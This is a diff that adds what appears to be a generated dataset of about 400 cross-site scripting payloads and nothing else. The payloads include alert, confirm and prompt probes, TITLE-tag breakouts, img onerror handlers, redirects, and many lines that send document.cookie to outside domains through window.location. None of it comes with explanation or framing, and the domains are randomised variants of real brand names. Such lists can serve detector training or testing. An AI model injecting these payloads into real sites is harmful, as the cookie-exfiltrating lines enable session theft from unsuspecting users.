@@ -1,0 +1,400 @@
+<script> alert ( 'changyou.com' ) </script>
+<script> window . location = 'http://www.ourtoolbar.com/?cookie=' + document . cookie </script>
+<script> alert ( 'fotolog.com' ) </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('zshare.com')" > </image>
+<image src = 1 href = 1 onerror = "javascript:confirm('hotwire.tv')" > </image>
+</TITLE> <SCRIPT> prompt ( 'wauee.tv' ) ; </SCRIPT>
+<script> alert ( 'boosj.info' ) </script>
+<script> alert ( 'zoosk.net' ) </script>
+</TITLE> <SCRIPT> prompt ( 'ourtoolbar.co' ) ; </SCRIPT>
+<image src = 1 href = 1 onerror = "javascript:confirm('ctrip.info')" > </image>
+</TITLE> <SCRIPT> prompt ( 'homedepot.org' ) ; </SCRIPT>
+<script> window . location = 'http://www.zdnet.info/?cookie=' + document . cookie </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('changyou.gov')" > </image>
+<script> window . location = 'http://www.ourtoolbar.org/?cookie=' + document . cookie </script>
+<script> window . location = 'http://www.youku.info/?cookie=' + document . cookie </script>
+</TITLE> <SCRIPT> prompt ( 'hotwire.com' ) ; </SCRIPT>
+<script> window . location = 'http://www.addictinggames.com/?cookie=' + document . cookie </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('var2')" > </image>
+</TITLE> <SCRIPT> prompt ( 'zdnet.net' ) ; </SCRIPT>
+<script> window . location = "https://www.hotwire" </script>
+</TITLE> <SCRIPT> prompt ( 'addictinggames.tv' ) ; </SCRIPT>
+<script> window . location = "https://www.addictinggames.org" </script>
+<script> alert ( 'homedepot.co' ) </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('boosj.info')" > </image>
+<script> window . location = 'http://www.zshare.tv/?cookie=' + document . cookie </script>
+<script> window . location = 'http://www.panasonic.tv/?cookie=' + document . cookie </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('homedepot.co')" > </image>
+<script> alert ( 'boosj.tv' ) </script>
+<script> window . location = "https://www.fotolog.net" </script>
+</TITLE> <SCRIPT> prompt ( 'homedepot.tv' ) ; </SCRIPT>
+<image src = 1 href = 1 onerror = "javascript:confirm('fotolog.co')" > </image>
+</TITLE> <SCRIPT> prompt ( 'ctrip.org' ) ; </SCRIPT>
+<script> alert ( 'changyou.com' ) </script>
+<script> window . location = 'http://www.zoosk.info/?cookie=' + document . cookie </script>
+<script> window . location = "https://www.zoosk.gov" </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('homedepot.tv')" > </image>
+<script> window . location = "https://www.zoosk.org" </script>
+<script> window . location = "https://www.hotwire" </script>
+<script> alert ( 'changyou.net' ) </script>
+<script> window . location = "https://www.youku.com" </script>
+</TITLE> <SCRIPT> prompt ( 'boosj.com' ) ; </SCRIPT>
+<script> window . location = 'http://www.addictinggames.com/?cookie=' + document . cookie </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('wauee.net')" > </image>
+<script> alert ( 'hotwire.org' ) </script>
+<script> window . location = 'http://www.multiply/?cookie=' + document . cookie </script>
+<script> window . location = 'http://www.ourtoolbar.net/?cookie=' + document . cookie </script>
+<script> window . location = "https://www.ctrip.gov" </script>
+</TITLE> <SCRIPT> prompt ( 'ctrip.info' ) ; </SCRIPT>
+<script> window . location = 'http://www.zoosk.net/?cookie=' + document . cookie </script>
+<script> window . location = "https://www.multiply.gov" </script>
+<script> alert ( 'zshare.tv' ) </script>
+<script> alert ( 'youku.org' ) </script>
+<script> alert ( 'zdnet.com' ) </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('changyou.tv')" > </image>
+<image src = 1 href = 1 onerror = "javascript:confirm('fotolog.org')" > </image>
+<script> window . location = "https://www.ourtoolbar.org" </script>
+<script> window . location = 'http://www.addictinggames.com/?cookie=' + document . cookie </script>
+<script> window . location = 'http://www.zshare.gov/?cookie=' + document . cookie </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('var2')" > </image>
+<script> alert ( 'zoosk' ) </script>
+<script> alert ( 'changyou.com' ) </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('ourtoolbar.org')" > </image>
+<script> window . location = "https://www.youku.org" </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('boosj.info')" > </image>
+<script> window . location = "https://www.changyou.net" </script>
+<script> window . location = "https://www.homedepot.org" </script>
+<script> alert ( 'amazon.org' ) </script>
+<script> alert ( 'zoosk.net' ) </script>
+</TITLE> <SCRIPT> prompt ( 'panasonic.gov' ) ; </SCRIPT>
+<script> alert ( 'fotolog.net' ) </script>
+</TITLE> <SCRIPT> prompt ( 'ourtoolbar.gov' ) ; </SCRIPT>
+<script> window . location = "https://www.zdnet" </script>
+<script> window . location = "https://www.ctrip.net" </script>
+</TITLE> <SCRIPT> prompt ( 'youku.tv' ) ; </SCRIPT>
+<image src = 1 href = 1 onerror = "javascript:confirm('ctrip.com')" > </image>
+</TITLE> <SCRIPT> prompt ( 'zshare.gov' ) ; </SCRIPT>
+<script> window . location = "https://www.zdnet.info" </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('ctrip.info')" > </image>
+<script> alert ( 'hotwire.net' ) </script>
+</TITLE> <SCRIPT> prompt ( 'panasonic.info' ) ; </SCRIPT>
+<script> window . location = "https://www.ctrip.co" </script>
+<script> window . location = 'http://www.homedepot.co/?cookie=' + document . cookie </script>
+<script> window . location = "https://www.multiply.net" </script>
+<script> window . location = 'http://www.fotolog.org/?cookie=' + document . cookie </script>
+<script> window . location = "https://www.panasonic.net" </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('panasonic.info')" > </image>
+</TITLE> <SCRIPT> prompt ( 'changyou.com' ) ; </SCRIPT>
+<image src = 1 href = 1 onerror = "javascript:confirm('zshare.com')" > </image>
+<script> alert ( 'ourtoolbar.info' ) </script>
+<script> alert ( 'amazon.info' ) </script>
+</TITLE> <SCRIPT> prompt ( 'amazon.net' ) ; </SCRIPT>
+</TITLE> <SCRIPT> prompt ( 'changyou.gov' ) ; </SCRIPT>
+<script> alert ( 'ctrip.co' ) </script>
+<script> window . location = 'http://www.zoosk.com/?cookie=' + document . cookie </script>
+<script> alert ( 'zdnet.com' ) </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('boosj.net')" > </image>
+<script> window . location = "https://www.zdnet.co" </script>
+</TITLE> <SCRIPT> prompt ( 'wauee.com' ) ; </SCRIPT>
+<script> window . location = 'http://www.wauee.gov/?cookie=' + document . cookie </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('addictinggames.tv')" > </image>
+<script> alert ( 'zdnet.org' ) </script>
+<script> window . location = 'http://www.zoosk.tv/?cookie=' + document . cookie </script>
+<script> alert ( 'addictinggames.co' ) </script>
+</TITLE> <SCRIPT> prompt ( 'youku.net' ) ; </SCRIPT>
+<image src = 1 href = 1 onerror = "javascript:confirm('ourtoolbar.co')" > </image>
+<image src = 1 href = 1 onerror = "javascript:confirm('homedepot.com')" > </image>
+<script> window . location = 'http://www.youku.gov/?cookie=' + document . cookie </script>
+<script> window . location = "https://www.zshare.org" </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('panasonic.co')" > </image>
+<image src = 1 href = 1 onerror = "javascript:confirm('addictinggames.org')" > </image>
+<script> window . location = "https://www.panasonic.gov" </script>
+<script> alert ( 'changyou.com' ) </script>
+<script> window . location = "https://www.hotwire.co" </script>
+</TITLE> <SCRIPT> prompt ( 'fotolog.com' ) ; </SCRIPT>
+<script> window . location = 'http://www.wauee/?cookie=' + document . cookie </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('homedepot.info')" > </image>
+<script> alert ( 'hotwire.info' ) </script>
+<script> window . location = 'http://www.ctrip.info/?cookie=' + document . cookie </script>
+<script> window . location = 'http://www.changyou.tv/?cookie=' + document . cookie </script>
+<script> alert ( 'panasonic.info' ) </script>
+<script> window . location = 'http://www.zoosk.net/?cookie=' + document . cookie </script>
+<script> alert ( 'zoosk.org' ) </script>
+<script> window . location = 'http://www.panasonic.com/?cookie=' + document . cookie </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('youku.info')" > </image>
+<script> window . location = "https://www.amazon.co" </script>
+<script> alert ( 'wauee.net' ) </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('youku.co')" > </image>
+<image src = 1 href = 1 onerror = "javascript:confirm('multiply.org')" > </image>
+<image src = 1 href = 1 onerror = "javascript:confirm('var2')" > </image>
+<script> alert ( 'hotwire.net' ) </script>
+</TITLE> <SCRIPT> prompt ( 'addictinggames.gov' ) ; </SCRIPT>
+<script> window . location = 'http://www.multiply.com/?cookie=' + document . cookie </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('zshare.com')" > </image>
+<image src = 1 href = 1 onerror = "javascript:confirm('hotwire.tv')" > </image>
+<script> window . location = 'http://www.homedepot.com/?cookie=' + document . cookie </script>
+</TITLE> <SCRIPT> prompt ( 'ctrip.net' ) ; </SCRIPT>
+<script> window . location = 'http://www.homedepot.net/?cookie=' + document . cookie </script>
+<script> window . location = "https://www.addictinggames.com" </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('homedepot.gov')" > </image>
+<script> alert ( 'zoosk.com' ) </script>
+<script> alert ( 'addictinggames.org' ) </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('changyou.org')" > </image>
+</TITLE> <SCRIPT> prompt ( 'ourtoolbar.tv' ) ; </SCRIPT>
+<script> window . location = 'http://www.hotwire.gov/?cookie=' + document . cookie </script>
+<script> window . location = "https://www.ourtoolbar.gov" </script>
+<script> window . location = 'http://www.zshare.gov/?cookie=' + document . cookie </script>
+<script> window . location = 'http://www.addictinggames.org/?cookie=' + document . cookie </script>
+<script> window . location = "https://www.youku.gov" </script>
+<script> alert ( 'changyou.com' ) </script>
+<script> alert ( 'wauee.tv' ) </script>
+</TITLE> <SCRIPT> prompt ( 'amazon.com' ) ; </SCRIPT>
+<script> window . location = "https://www.amazon.net" </script>
+<script> alert ( 'zdnet.net' ) </script>
+<script> window . location = 'http://www.fotolog.info/?cookie=' + document . cookie </script>
+<script> window . location = 'http://www.boosj.tv/?cookie=' + document . cookie </script>
+<script> alert ( 'ourtoolbar.co' ) </script>
+<script> alert ( 'fotolog.com' ) </script>
+<script> alert ( 'zshare.info' ) </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('boosj.tv')" > </image>
+</TITLE> <SCRIPT> prompt ( 'ourtoolbar.org' ) ; </SCRIPT>
+<script> window . location = 'http://www.youku.gov/?cookie=' + document . cookie </script>
+<script> alert ( 'multiply.co' ) </script>
+</TITLE> <SCRIPT> prompt ( 'zshare.info' ) ; </SCRIPT>
+<script> window . location = 'http://www.fotolog.tv/?cookie=' + document . cookie </script>
+</TITLE> <SCRIPT> prompt ( 'fotolog.tv' ) ; </SCRIPT>
+<script> alert ( 'ourtoolbar.tv' ) </script>
+<script> alert ( 'zoosk.co' ) </script>
+<script> window . location = 'http://www.youku.tv/?cookie=' + document . cookie </script>
+<script> window . location = 'http://www.ourtoolbar.net/?cookie=' + document . cookie </script>
+</TITLE> <SCRIPT> prompt ( 'homedepot.co' ) ; </SCRIPT>
+<script> window . location = 'http://www.youku.net/?cookie=' + document . cookie </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('panasonic.info')" > </image>
+<image src = 1 href = 1 onerror = "javascript:confirm('ourtoolbar.net')" > </image>
+<script> window . location = "https://www.hotwire.gov" </script>
+</TITLE> <SCRIPT> prompt ( 'hotwire.tv' ) ; </SCRIPT>
+<script> alert ( 'homedepot.tv' ) </script>
+<script> window . location = 'http://www.changyou/?cookie=' + document . cookie </script>
+<script> window . location = 'http://www.fotolog/?cookie=' + document . cookie </script>
+<script> window . location = "https://www.fotolog.info" </script>
+<script> alert ( 'panasonic.org' ) </script>
+</TITLE> <SCRIPT> prompt ( 'ctrip.tv' ) ; </SCRIPT>
+<script> alert ( 'zdnet.com' ) </script>
+<script> alert ( 'changyou.gov' ) </script>
+</TITLE> <SCRIPT> prompt ( 'zdnet.com' ) ; </SCRIPT>
+<script> window . location = "https://www.addictinggames.gov" </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('boosj.co')" > </image>
+<script> alert ( 'addictinggames.net' ) </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('ctrip.com')" > </image>
+<script> alert ( 'zshare.com' ) </script>
+<script> alert ( 'changyou.com' ) </script>
+<script> window . location = 'http://www.panasonic.info/?cookie=' + document . cookie </script>
+<script> window . location = "https://www.changyou.org" </script>
+<script> window . location = "https://www.wauee.co" </script>
+<script> window . location = 'http://www.zoosk.co/?cookie=' + document . cookie </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('amazon.org')" > </image>
+</TITLE> <SCRIPT> prompt ( 'homedepot.gov' ) ; </SCRIPT>
+<script> window . location = 'http://www.boosj.gov/?cookie=' + document . cookie </script>
+</TITLE> <SCRIPT> prompt ( 'ctrip.gov' ) ; </SCRIPT>
+<image src = 1 href = 1 onerror = "javascript:confirm('boosj.net')" > </image>
+<script> window . location = 'http://www.zdnet.gov/?cookie=' + document . cookie </script>
+</TITLE> <SCRIPT> prompt ( 'multiply.info' ) ; </SCRIPT>
+</TITLE> <SCRIPT> prompt ( 'ctrip.com' ) ; </SCRIPT>
+<script> window . location = 'http://www.addictinggames.net/?cookie=' + document . cookie </script>
+<script> window . location = "https://www.hotwire.tv" </script>
+<script> window . location = 'http://www.hotwire.tv/?cookie=' + document . cookie </script>
+<script> window . location = "https://www.boosj.info" </script>
+<script> window . location = "https://www.zshare.tv" </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('zshare.tv')" > </image>
+<script> window . location = "https://www.ctrip.gov" </script>
+</TITLE> <SCRIPT> prompt ( 'boosj.co' ) ; </SCRIPT>
+<script> window . location = 'http://www.ourtoolbar.net/?cookie=' + document . cookie </script>
+<script> alert ( 'youku.co' ) </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('youku.co')" > </image>
+</TITLE> <SCRIPT> prompt ( 'wauee.com' ) ; </SCRIPT>
+<image src = 1 href = 1 onerror = "javascript:confirm('zshare.info')" > </image>
+<image src = 1 href = 1 onerror = "javascript:confirm('boosj.co')" > </image>
+<image src = 1 href = 1 onerror = "javascript:confirm('var0')" > </image>
+<image src = 1 href = 1 onerror = "javascript:confirm('boosj.org')" > </image>
+<script> alert ( 'fotolog.info' ) </script>
+<script> window . location = 'http://www.youku.info/?cookie=' + document . cookie </script>
+<script> alert ( 'changyou.co' ) </script>
+</TITLE> <SCRIPT> prompt ( 'ourtoolbar.gov' ) ; </SCRIPT>
+</TITLE> <SCRIPT> prompt ( 'ctrip.gov' ) ; </SCRIPT>
+<image src = 1 href = 1 onerror = "javascript:confirm('fotolog.org')" > </image>
+<script> window . location = 'http://www.boosj.net/?cookie=' + document . cookie </script>
+<script> window . location = "https://www.ourtoolbar.org" </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('panasonic.tv')" > </image>
+<script> window . location = 'http://www.panasonic.tv/?cookie=' + document . cookie </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('addictinggames.info')" > </image>
+</TITLE> <SCRIPT> prompt ( 'youku.co' ) ; </SCRIPT>
+<script> alert ( 'addictinggames.tv' ) </script>
+<script> window . location = 'http://www.ctrip.info/?cookie=' + document . cookie </script>
+<script> alert ( 'changyou.info' ) </script>
+<script> alert ( 'boosj.tv' ) </script>
+</TITLE> <SCRIPT> prompt ( 'wauee.info' ) ; </SCRIPT>
+<script> window . location = "https://www.wauee.co" </script>
+<script> window . location = 'http://www.boosj/?cookie=' + document . cookie </script>
+<script> window . location = 'http://www.amazon.net/?cookie=' + document . cookie </script>
+<script> window . location = "https://www.multiply.gov" </script>
+</TITLE> <SCRIPT> prompt ( 'zshare.co' ) ; </SCRIPT>
+</TITLE> <SCRIPT> prompt ( 'addictinggames.info' ) ; </SCRIPT>
+<script> window . location = "https://www.zshare.com" </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('addictinggames.co')" > </image>
+<script> window . location = 'http://www.homedepot.info/?cookie=' + document . cookie </script>
+</TITLE> <SCRIPT> prompt ( 'addictinggames.gov' ) ; </SCRIPT>
+<script> window . location = 'http://www.multiply.org/?cookie=' + document . cookie </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('zdnet.info')" > </image>
+<script> window . location = 'http://www.youku.org/?cookie=' + document . cookie </script>
+<script> window . location = "https://www.hotwire" </script>
+<script> alert ( 'panasonic.tv' ) </script>
+<script> alert ( 'panasonic.org' ) </script>
+<script> window . location = "https://www.panasonic.co" </script>
+<script> window . location = 'http://www.fotolog.info/?cookie=' + document . cookie </script>
+<script> window . location = 'http://www.changyou.org/?cookie=' + document . cookie </script>
+<script> window . location = "https://www.youku.co" </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('ctrip.com')" > </image>
+<script> window . location = "https://www.homedepot.org" </script>
+<script> window . location = 'http://www.fotolog.org/?cookie=' + document . cookie </script>
+<script> window . location = "https://www.youku.org" </script>
+</TITLE> <SCRIPT> prompt ( 'multiply.tv' ) ; </SCRIPT>
+<image src = 1 href = 1 onerror = "javascript:confirm('youku.info')" > </image>
+<script> alert ( 'amazon.gov' ) </script>
+<script> window . location = 'http://www.homedepot.com/?cookie=' + document . cookie </script>
+<script> window . location = 'http://www.zshare.gov/?cookie=' + document . cookie </script>
+<script> alert ( 'changyou.com' ) </script>
+<script> window . location = "https://www.wauee.com" </script>
+</TITLE> <SCRIPT> prompt ( 'ctrip.com' ) ; </SCRIPT>
+<script> alert ( 'wauee.co' ) </script>
+<script> window . location = 'http://www.addictinggames.com/?cookie=' + document . cookie </script>
+<script> alert ( 'amazon.tv' ) </script>
+<script> window . location = 'http://www.multiply.com/?cookie=' + document . cookie </script>
+<script> window . location = 'http://www.changyou.gov/?cookie=' + document . cookie </script>
+</TITLE> <SCRIPT> prompt ( 'multiply.info' ) ; </SCRIPT>
+<script> window . location = 'http://www.ourtoolbar.tv/?cookie=' + document . cookie </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('zdnet.info')" > </image>
+<script> window . location = "https://www.addictinggames.com" </script>
+<script> window . location = 'http://www.multiply.tv/?cookie=' + document . cookie </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('addictinggames.net')" > </image>
+<image src = 1 href = 1 onerror = "javascript:confirm('multiply.com')" > </image>
+<script> window . location = "https://www.hotwire.co" </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('var2')" > </image>
+<script> window . location = "https://www.addictinggames.info" </script>
+<script> alert ( 'hotwire.tv' ) </script>
+<script> alert ( 'boosj.com' ) </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('homedepot.gov')" > </image>
+<script> window . location = "https://www.zdnet.com" </script>
+<script> alert ( 'fotolog.org' ) </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('boosj.gov')" > </image>
+</TITLE> <SCRIPT> prompt ( 'changyou.net' ) ; </SCRIPT>
+<image src = 1 href = 1 onerror = "javascript:confirm('addictinggames.net')" > </image>
+<image src = 1 href = 1 onerror = "javascript:confirm('multiply.tv')" > </image>
+<image src = 1 href = 1 onerror = "javascript:confirm('fotolog.tv')" > </image>
+<script> window . location = 'http://www.ourtoolbar.gov/?cookie=' + document . cookie </script>
+<script> window . location = 'http://www.zoosk.tv/?cookie=' + document . cookie </script>
+<script> window . location = 'http://www.homedepot.org/?cookie=' + document . cookie </script>
+<script> window . location = "https://www.zoosk.org" </script>
+<script> window . location = 'http://www.fotolog.co/?cookie=' + document . cookie </script>
+<script> window . location = 'http://www.youku.co/?cookie=' + document . cookie </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('multiply.info')" > </image>
+<script> alert ( 'changyou.com' ) </script>
+<script> window . location = "https://www.fotolog.co" </script>
+<script> alert ( 'youku.net' ) </script>
+<script> alert ( 'panasonic.gov' ) </script>
+<script> window . location = 'http://www.panasonic.gov/?cookie=' + document . cookie </script>
+<script> window . location = "https://www.homedepot.tv" </script>
+<script> alert ( 'boosj.co' ) </script>
+<script> alert ( 'changyou.com' ) </script>
+</TITLE> <SCRIPT> prompt ( 'panasonic' ) ; </SCRIPT>
+<script> window . location = 'http://www.zshare.net/?cookie=' + document . cookie </script>
+<script> window . location = 'http://www.zoosk/?cookie=' + document . cookie </script>
+<script> alert ( 'zshare.com' ) </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('hotwire.net')" > </image>
+<script> window . location = "https://www.hotwire.com" </script>
+<script> window . location = "https://www.addictinggames.gov" </script>
+<script> window . location = "https://www.panasonic.tv" </script>
+</TITLE> <SCRIPT> prompt ( 'amazon.gov' ) ; </SCRIPT>
+< iscript > window . location = "https://www.ourtoolbar.com" < / iscript >
+<script> window . location = "https://www.panasonic.org" </script>
+<script> window . location = "https://www.changyou.co" </script>
+<script> window . location = "https://www.addictinggames.tv" </script>
+<script> window . location = 'http://www.multiply/?cookie=' + document . cookie </script>
+<script> window . location = "https://www.zdnet.tv" </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('boosj.net')" > </image>
+</TITLE> <SCRIPT> prompt ( 'hotwire.com' ) ; </SCRIPT>
+<script> window . location = 'http://www.youku.co/?cookie=' + document . cookie </script>
+<script> window . location = 'http://www.boosj.co/?cookie=' + document . cookie </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('zshare.com')" > </image>
+<script> alert ( 'changyou.com' ) </script>
+<script> alert ( 'fotolog.net' ) </script>
+<script> window . location = 'http://www.multiply.info/?cookie=' + document . cookie </script>
+<script> window . location = 'http://www.panasonic.info/?cookie=' + document . cookie </script>
+<script> alert ( 'youku.net' ) </script>
+<script> window . location = 'http://www.addictinggames.com/?cookie=' + document . cookie </script>
+<script> window . location = "https://www.zshare.info" </script>
+</TITLE> <SCRIPT> prompt ( 'changyou.co' ) ; </SCRIPT>
+<script> window . location = 'http://www.addictinggames.net/?cookie=' + document . cookie </script>
+<script> alert ( 'zdnet.info' ) </script>
+<script> window . location = "https://www.fotolog.net" </script>
+<script> alert ( 'hotwire.co' ) </script>
+<script> window . location = "https://www.homedepot.com" </script>
+<script> alert ( 'addictinggames.tv' ) </script>
+<script> window . location = 'http://www.zoosk.gov/?cookie=' + document . cookie </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('zshare.info')" > </image>
+<image src = 1 href = 1 onerror = "javascript:confirm('ctrip.gov')" > </image>
+<script> window . location = "https://www.ctrip.org" </script>
+<script> alert ( 'zoosk.tv' ) </script>
+<script> window . location = 'http://www.fotolog.gov/?cookie=' + document . cookie </script>
+<script> window . location = "https://www.ourtoolbar.org" </script>
+</TITLE> <SCRIPT> prompt ( 'ctrip.com' ) ; </SCRIPT>
+<script> window . location = "https://www.hotwire.gov" </script>
+<script> alert ( 'zdnet.info' ) </script>
+<script> window . location = 'http://www.ourtoolbar.tv/?cookie=' + document . cookie </script>
+<script> window . location = 'http://www.multiply.net/?cookie=' + document . cookie </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('addictinggames.info')" > </image>
+<image src = 1 href = 1 onerror = "javascript:confirm('zdnet.gov')" > </image>
+<script> window . location = "https://www.amazon.org" </script>
+<script> window . location = 'http://www.ctrip.gov/?cookie=' + document . cookie </script>
+<script> window . location = 'http://www.homedepot.gov/?cookie=' + document . cookie </script>
+<script> window . location = "https://www.panasonic.com" </script>
+</TITLE> <SCRIPT> prompt ( 'amazon' ) ; </SCRIPT>
+<script> alert ( 'changyou.gov' ) </script>
+<script> window . location = 'http://www.hotwire.com/?cookie=' + document . cookie </script>
+<script> alert ( 'changyou.com' ) </script>
+<script> window . location = 'http://www.zoosk.org/?cookie=' + document . cookie </script>
+<script> window . location = 'http://www.fotolog.net/?cookie=' + document . cookie </script>
+<script> window . location = 'http://www.changyou.com/?cookie=' + document . cookie </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('zshare.com')" > </image>
+<script> window . location = "https://www.youku.net" </script>
+<script> alert ( 'text' ) </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('ourtoolbar.com')" > </image>
+</TITLE> <SCRIPT> prompt ( 'multiply.org' ) ; </SCRIPT>
+<script> alert ( 'youku.tv' ) </script>
+</TITLE> <SCRIPT> prompt ( 'multiply.co' ) ; </SCRIPT>
+<image src = 1 href = 1 onerror = "javascript:confirm('wauee.org')" > </image>
+<script> window . location = "https://www.fotolog.gov" </script>
+</TITLE> <SCRIPT> prompt ( 'addictinggames.com' ) ; </SCRIPT>
+<script> alert ( 'homedepot.com' ) </script>
+<script> window . location = 'http://www.zdnet.org/?cookie=' + document . cookie </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('zshare.co')" > </image>
+<script> window . location = "https://www.multiply.tv" </script>
+<script> alert ( 'boosj.org' ) </script>
+<script> window . location = 'http://www.hotwire.gov/?cookie=' + document . cookie </script>
+<script> alert ( 'zoosk.com' ) </script>
+<script> window . location = 'http://www.addictinggames.net/?cookie=' + document . cookie </script>
+<script> window . location = "https://www.changyou.org" </script>
+<script> window . location = 'http://www.ctrip.gov/?cookie=' + document . cookie </script>
+<script> window . location = 'http://www.multiply.tv/?cookie=' + document . cookie </script>
+<script> alert ( 'zshare.tv' ) </script>
+<script> window . location = 'http://www.addictinggames.gov/?cookie=' + document . cookie </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('var2')" > </image>
+<image src = 1 href = 1 onerror = "javascript:confirm('ctrip.com')" > </image>
+<image src = 1 href = 1 onerror = "javascript:confirm('zshare.co')" > </image>
+<script> window . location = 'http://www.ctrip.org/?cookie=' + document . cookie </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('fotolog.co')" > </image>
+<script> window . location = 'http://www.multiply/?cookie=' + document . cookie </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('changyou.org')" > </image>
+<image src = 1 href = 1 onerror = "javascript:confirm('zdnet.com')" > </image>
+<script> alert ( 'ctrip.info' ) </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('hotwire.co')" > </image>
+<image src = 1 href = 1 onerror = "javascript:confirm('youku.tv')" > </image>
